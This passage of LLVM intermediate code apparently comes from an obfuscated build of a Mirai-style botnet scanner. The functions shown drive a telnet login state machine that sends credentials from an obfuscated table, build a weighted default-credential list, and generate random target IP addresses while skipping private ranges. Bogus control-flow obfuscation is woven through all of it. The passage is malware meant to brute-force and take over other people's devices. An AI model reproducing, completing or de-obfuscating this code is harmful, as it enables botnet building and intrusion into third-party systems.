  %2185 = load i32, i32* %2184, align 8
  %2186 = call i32 @close(i32 %2185)
  %2187 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2188 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2187, i32 0, i32 1
  store i32 -1, i32* %2188, align 8
  %2189 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2190 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2189, i32 0, i32 8
  %2191 = load i8, i8* %2190, align 8
  %_276 = shl i8 %2191, 1
  %_277 = sub i8 0, %2191
  %gen278 = add i8 %_277, 1
  %_279 = shl i8 %2191, 1
  %_280 = shl i8 %2191, 1
  %2192 = add i8 %2191, 1
  store i8 %2192, i8* %2190, align 8
  %2193 = zext i8 %2192 to i32
  %2194 = icmp sge i32 %2193, 10
  br label %originalBB275

originalBB284alteredBB:                           ; preds = %originalBB284, %1315
  store i32 0, i32* %41, align 4
  %2195 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2196 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2195, i32 0, i32 3
  %2197 = load i32, i32* %2196, align 8
  br label %originalBB284

originalBB288alteredBB:                           ; preds = %originalBB288, %1335
  %2198 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2199 = call i32 @consume_iacs(%struct.scanner_connection* %2198)
  store i32 %2199, i32* %41, align 4
  %2200 = icmp sgt i32 %2199, 0
  br label %originalBB288

originalBB292alteredBB:                           ; preds = %originalBB292, %1358
  br label %originalBB292

originalBB296alteredBB:                           ; preds = %originalBB296, %1433
  call void @table_unlock_val(i8 zeroext 5)
  %2201 = call i8* @table_retrieve_val(i32 5, i32* %43)
  store i8* %2201, i8** %42, align 8
  %2202 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2203 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2202, i32 0, i32 1
  %2204 = load i32, i32* %2203, align 8
  %2205 = load i8*, i8** %42, align 8
  %2206 = load i32, i32* %43, align 4
  %2207 = sext i32 %2206 to i64
  %2208 = call i64 @send(i32 %2204, i8* %2205, i64 %2207, i32 16384)
  %2209 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2210 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2209, i32 0, i32 1
  %2211 = load i32, i32* %2210, align 8
  %2212 = call i64 @send(i32 %2211, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %2213 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2214 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2213, i32 0, i32 3
  store i32 6, i32* %2214, align 8
  br label %originalBB296

originalBB300alteredBB:                           ; preds = %originalBB300, %1464
  br label %originalBB300

originalBB304alteredBB:                           ; preds = %originalBB304, %1481
  %2215 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2216 = call i32 @consume_any_prompt(%struct.scanner_connection* %2215)
  store i32 %2216, i32* %41, align 4
  %2217 = icmp sgt i32 %2216, 0
  br label %originalBB304

originalBB308alteredBB:                           ; preds = %originalBB308, %1501
  call void @table_unlock_val(i8 zeroext 6)
  %2218 = call i8* @table_retrieve_val(i32 6, i32* %45)
  store i8* %2218, i8** %44, align 8
  %2219 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2219, i32 0, i32 1
  %2221 = load i32, i32* %2220, align 8
  %2222 = load i8*, i8** %44, align 8
  %2223 = load i32, i32* %45, align 4
  %2224 = sext i32 %2223 to i64
  %2225 = call i64 @send(i32 %2221, i8* %2222, i64 %2224, i32 16384)
  %2226 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2227 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2226, i32 0, i32 1
  %2228 = load i32, i32* %2227, align 8
  %2229 = call i64 @send(i32 %2228, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 6)
  %2230 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2231 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2230, i32 0, i32 3
  store i32 7, i32* %2231, align 8
  br label %originalBB308

originalBB312alteredBB:                           ; preds = %originalBB312, %1532
  br label %originalBB312

originalBB316alteredBB:                           ; preds = %originalBB316, %1549
  %2232 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2233 = call i32 @consume_any_prompt(%struct.scanner_connection* %2232)
  store i32 %2233, i32* %41, align 4
  %2234 = icmp sgt i32 %2233, 0
  br label %originalBB316

originalBB320alteredBB:                           ; preds = %originalBB320, %1584
  br label %originalBB320

originalBB324alteredBB:                           ; preds = %originalBB324, %1601
  %2235 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2236 = call i32 @consume_any_prompt(%struct.scanner_connection* %2235)
  store i32 %2236, i32* %41, align 4
  %2237 = icmp sgt i32 %2236, 0
  br label %originalBB324

originalBB328alteredBB:                           ; preds = %originalBB328, %1621
  call void @table_unlock_val(i8 zeroext 7)
  %2238 = call i8* @table_retrieve_val(i32 7, i32* %49)
  store i8* %2238, i8** %48, align 8
  %2239 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2240 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2239, i32 0, i32 1
  %2241 = load i32, i32* %2240, align 8
  %2242 = load i8*, i8** %48, align 8
  %2243 = load i32, i32* %49, align 4
  %2244 = sext i32 %2243 to i64
  %2245 = call i64 @send(i32 %2241, i8* %2242, i64 %2244, i32 16384)
  %2246 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2247 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2246, i32 0, i32 1
  %2248 = load i32, i32* %2247, align 8
  %2249 = call i64 @send(i32 %2248, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 7)
  %2250 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2251 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2250, i32 0, i32 3
  store i32 9, i32* %2251, align 8
  br label %originalBB328

originalBB332alteredBB:                           ; preds = %originalBB332, %1657
  call void @table_unlock_val(i8 zeroext 8)
  %2252 = call i8* @table_retrieve_val(i32 8, i32* %51)
  store i8* %2252, i8** %50, align 8
  %2253 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2254 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2253, i32 0, i32 1
  %2255 = load i32, i32* %2254, align 8
  %2256 = load i8*, i8** %50, align 8
  %2257 = load i32, i32* %51, align 4
  %2258 = sext i32 %2257 to i64
  %2259 = call i64 @send(i32 %2255, i8* %2256, i64 %2258, i32 16384)
  %2260 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2261 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2260, i32 0, i32 1
  %2262 = load i32, i32* %2261, align 8
  %2263 = call i64 @send(i32 %2262, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 8)
  %2264 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2265 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2264, i32 0, i32 3
  store i32 10, i32* %2265, align 8
  br label %originalBB332

originalBB336alteredBB:                           ; preds = %originalBB336, %1689
  %2266 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2267 = call i32 @consume_resp_prompt(%struct.scanner_connection* %2266)
  store i32 %2267, i32* %41, align 4
  %2268 = load i32, i32* %41, align 4
  %2269 = icmp eq i32 %2268, -1
  br label %originalBB336

originalBB340alteredBB:                           ; preds = %originalBB340, %1723
  %2270 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2271 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2270, i32 0, i32 8
  store i8 0, i8* %2271, align 8
  %2272 = load %struct.scanner_connection*, %struct.scanner_connection** %15, align 8
  %2273 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %2272, i32 0, i32 3
  store i32 0, i32* %2273, align 8
  br label %originalBB340

originalBB344alteredBB:                           ; preds = %originalBB344, %1746
  br label %originalBB344

originalBB348alteredBB:                           ; preds = %originalBB348, %1784
  br label %originalBB348

originalBB352alteredBB:                           ; preds = %originalBB352, %1801
  br label %originalBB352

originalBB356alteredBB:                           ; preds = %originalBB356, %1822
  br label %originalBB356

originalBB360alteredBB:                           ; preds = %originalBB360, %1871
  br label %originalBB360

originalBB364alteredBB:                           ; preds = %originalBB364, %1891
  br label %originalBB364
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = load i32, i32* @x.65
  %5 = load i32, i32* @y.66
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  store i16 %2, i16* %14, align 2
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = bitcast %struct.scanner_auth* %16 to i8*
  %18 = load i32, i32* @auth_table_len, align 4
  %19 = add nsw i32 %18, 1
  %20 = sext i32 %19 to i64
  %21 = mul i64 %20, 24
  %22 = call i8* @realloc(i8* %17, i64 %21) #6
  %23 = bitcast i8* %22 to %struct.scanner_auth*
  store %struct.scanner_auth* %23, %struct.scanner_auth** @auth_table, align 8
  %24 = load i8*, i8** %12, align 8
  %25 = call i8* @deobf(i8* %24, i32* %15)
  %26 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %27 = load i32, i32* @auth_table_len, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %26, i64 %28
  %30 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %29, i32 0, i32 0
  store i8* %25, i8** %30, align 8
  %31 = load i32, i32* %15, align 4
  %32 = trunc i32 %31 to i8
  %33 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %34 = load i32, i32* @auth_table_len, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %33, i64 %35
  %37 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %36, i32 0, i32 4
  store i8 %32, i8* %37, align 4
  %38 = load i8*, i8** %13, align 8
  %39 = call i8* @deobf(i8* %38, i32* %15)
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* @auth_table_len, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %43, i32 0, i32 1
  store i8* %39, i8** %44, align 8
  %45 = load i32, i32* %15, align 4
  %46 = trunc i32 %45 to i8
  %47 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %48 = load i32, i32* @auth_table_len, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %47, i64 %49
  %51 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %50, i32 0, i32 5
  store i8 %46, i8* %51, align 1
  %52 = load i16, i16* @auth_table_max_weight, align 2
  %53 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %54 = load i32, i32* @auth_table_len, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %53, i64 %55
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 2
  store i16 %52, i16* %57, align 8
  %58 = load i16, i16* @auth_table_max_weight, align 2
  %59 = zext i16 %58 to i32
  %60 = load i16, i16* %14, align 2
  %61 = zext i16 %60 to i32
  %62 = add nsw i32 %59, %61
  %63 = trunc i32 %62 to i16
  %64 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %65 = load i32, i32* @auth_table_len, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* @auth_table_len, align 4
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %64, i64 %67
  %69 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %68, i32 0, i32 3
  store i16 %63, i16* %69, align 2
  %70 = load i16, i16* %14, align 2
  %71 = zext i16 %70 to i32
  %72 = load i16, i16* @auth_table_max_weight, align 2
  %73 = zext i16 %72 to i32
  %74 = add nsw i32 %73, %71
  %75 = trunc i32 %74 to i16
  store i16 %75, i16* @auth_table_max_weight, align 2
  %76 = load i32, i32* @x.65
  %77 = load i32, i32* @y.66
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %84 = alloca i8*, align 8
  %85 = alloca i8*, align 8
  %86 = alloca i16, align 2
  %87 = alloca i32, align 4
  store i8* %0, i8** %84, align 8
  store i8* %1, i8** %85, align 8
  store i16 %2, i16* %86, align 2
  %88 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %89 = bitcast %struct.scanner_auth* %88 to i8*
  %90 = load i32, i32* @auth_table_len, align 4
  %_ = sub i32 %90, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %90, 1
  %gen2 = mul i32 %_1, 1
  %91 = add nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %_3 = sub i64 %92, 24
  %gen4 = mul i64 %_3, 24
  %_5 = sub i64 0, %92
  %gen6 = add i64 %_5, 24
  %_7 = shl i64 %92, 24
  %_8 = sub i64 %92, 24
  %gen9 = mul i64 %_8, 24
  %93 = mul i64 %92, 24
  %94 = call i8* @realloc(i8* %89, i64 %93) #6
  %95 = bitcast i8* %94 to %struct.scanner_auth*
  store %struct.scanner_auth* %95, %struct.scanner_auth** @auth_table, align 8
  %96 = load i8*, i8** %84, align 8
  %97 = call i8* @deobf(i8* %96, i32* %87)
  %98 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %99 = load i32, i32* @auth_table_len, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %98, i64 %100
  %102 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %101, i32 0, i32 0
  store i8* %97, i8** %102, align 8
  %103 = load i32, i32* %87, align 4
  %104 = trunc i32 %103 to i8
  %105 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %106 = load i32, i32* @auth_table_len, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %105, i64 %107
  %109 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %108, i32 0, i32 4
  store i8 %104, i8* %109, align 4
  %110 = load i8*, i8** %85, align 8
  %111 = call i8* @deobf(i8* %110, i32* %87)
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %113 = load i32, i32* @auth_table_len, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %112, i64 %114
  %116 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %115, i32 0, i32 1
  store i8* %111, i8** %116, align 8
  %117 = load i32, i32* %87, align 4
  %118 = trunc i32 %117 to i8
  %119 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %120 = load i32, i32* @auth_table_len, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %119, i64 %121
  %123 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %122, i32 0, i32 5
  store i8 %118, i8* %123, align 1
  %124 = load i16, i16* @auth_table_max_weight, align 2
  %125 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %126 = load i32, i32* @auth_table_len, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %125, i64 %127
  %129 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %128, i32 0, i32 2
  store i16 %124, i16* %129, align 8
  %130 = load i16, i16* @auth_table_max_weight, align 2
  %131 = zext i16 %130 to i32
  %132 = load i16, i16* %86, align 2
  %133 = zext i16 %132 to i32
  %_10 = shl i32 %131, %133
  %_11 = shl i32 %131, %133
  %_12 = sub i32 %131, %133
  %gen13 = mul i32 %_12, %133
  %_14 = sub i32 %131, %133
  %gen15 = mul i32 %_14, %133
  %_16 = sub i32 0, %131
  %gen17 = add i32 %_16, %133
  %134 = add nsw i32 %131, %133
  %135 = trunc i32 %134 to i16
  %136 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %137 = load i32, i32* @auth_table_len, align 4
  %_18 = shl i32 %137, 1
  %_19 = sub i32 %137, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %137, 1
  %138 = add nsw i32 %137, 1
  store i32 %138, i32* @auth_table_len, align 4
  %139 = sext i32 %137 to i64
  %140 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %136, i64 %139
  %141 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %140, i32 0, i32 3
  store i16 %135, i16* %141, align 2
  %142 = load i16, i16* %86, align 2
  %143 = zext i16 %142 to i32
  %144 = load i16, i16* @auth_table_max_weight, align 2
  %145 = zext i16 %144 to i32
  %_22 = sub i32 %145, %143
  %gen23 = mul i32 %_22, %143
  %_24 = sub i32 %145, %143
  %gen25 = mul i32 %_24, %143
  %_26 = sub i32 0, %145
  %gen27 = add i32 %_26, %143
  %_28 = sub i32 0, %145
  %gen29 = add i32 %_28, %143
  %_30 = sub i32 %145, %143
  %gen31 = mul i32 %_30, %143
  %_32 = shl i32 %145, %143
  %_33 = sub i32 %145, %143
  %gen34 = mul i32 %_33, %143
  %_35 = sub i32 0, %145
  %gen36 = add i32 %_35, %143
  %146 = add nsw i32 %145, %143
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* @auth_table_max_weight, align 2
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = load i32, i32* @x.67
  %2 = load i32, i32* @y.68
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i8, align 1
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = load i32, i32* @x.67
  %15 = load i32, i32* @y.68
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %529, %originalBBpart2
  %23 = call i32 @rand_next()
  store i32 %23, i32* %9, align 4
  %24 = load i32, i32* %9, align 4
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %10, align 1
  %27 = load i32, i32* %9, align 4
  %28 = lshr i32 %27, 8
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %11, align 1
  %31 = load i32, i32* %9, align 4
  %32 = lshr i32 %31, 16
  %33 = and i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i32, i32* %9, align 4
  %36 = lshr i32 %35, 24
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %13, align 1
  br label %39

; <label>:39:                                     ; preds = %22
  %40 = load i8, i8* %10, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 127
  br i1 %42, label %529, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* @x.67
  %45 = load i32, i32* @y.68
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %43
  %52 = load i8, i8* %10, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 0
  %55 = load i32, i32* @x.67
  %56 = load i32, i32* @y.68
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %529, label %63

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* @x.67
  %65 = load i32, i32* @y.68
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  %72 = load i8, i8* %10, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 3
  %75 = load i32, i32* @x.67
  %76 = load i32, i32* @y.68
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %74, label %529, label %83

; <label>:83:                                     ; preds = %originalBBpart28
  %84 = load i8, i8* %10, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 15
  br i1 %86, label %529, label %87

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %10, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 16
  br i1 %90, label %529, label %91

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* %10, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 56
  br i1 %94, label %529, label %95

; <label>:95:                                     ; preds = %91
  %96 = load i8, i8* %10, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 10
  br i1 %98, label %529, label %99

; <label>:99:                                     ; preds = %95
  %100 = load i32, i32* @x.67
  %101 = load i32, i32* @y.68
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %99
  %108 = load i8, i8* %10, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 192
  %111 = load i32, i32* @x.67
  %112 = load i32, i32* @y.68
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %110, label %119, label %139

; <label>:119:                                    ; preds = %originalBBpart212
  %120 = load i32, i32* @x.67
  %121 = load i32, i32* @y.68
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %119
  %128 = load i8, i8* %11, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 168
  %131 = load i32, i32* @x.67
  %132 = load i32, i32* @y.68
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %130, label %529, label %139

; <label>:139:                                    ; preds = %originalBBpart216, %originalBBpart212
  %140 = load i8, i8* %10, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 172
  br i1 %142, label %143, label %167

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* %11, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp sge i32 %145, 16
  br i1 %146, label %147, label %167

; <label>:147:                                    ; preds = %143
  %148 = load i32, i32* @x.67
  %149 = load i32, i32* @y.68
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %147
  %156 = load i8, i8* %11, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp slt i32 %157, 32
  %159 = load i32, i32* @x.67
  %160 = load i32, i32* @y.68
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %158, label %529, label %167

; <label>:167:                                    ; preds = %originalBBpart220, %143, %139
  %168 = load i8, i8* %10, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 100
  br i1 %170, label %171, label %179

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* %11, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp sge i32 %173, 64
  br i1 %174, label %175, label %179

; <label>:175:                                    ; preds = %171
  %176 = load i8, i8* %11, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp slt i32 %177, 127
  br i1 %178, label %529, label %179

; <label>:179:                                    ; preds = %175, %171, %167
  %180 = load i8, i8* %10, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 169
  br i1 %182, label %183, label %203

; <label>:183:                                    ; preds = %179
  %184 = load i32, i32* @x.67
  %185 = load i32, i32* @y.68
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %183
  %192 = load i8, i8* %11, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp sgt i32 %193, 254
  %195 = load i32, i32* @x.67
  %196 = load i32, i32* @y.68
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %194, label %529, label %203

; <label>:203:                                    ; preds = %originalBBpart224, %179
  %204 = load i32, i32* @x.67
  %205 = load i32, i32* @y.68
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %203
  %212 = load i8, i8* %10, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 198
  %215 = load i32, i32* @x.67
  %216 = load i32, i32* @y.68
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %214, label %223, label %247

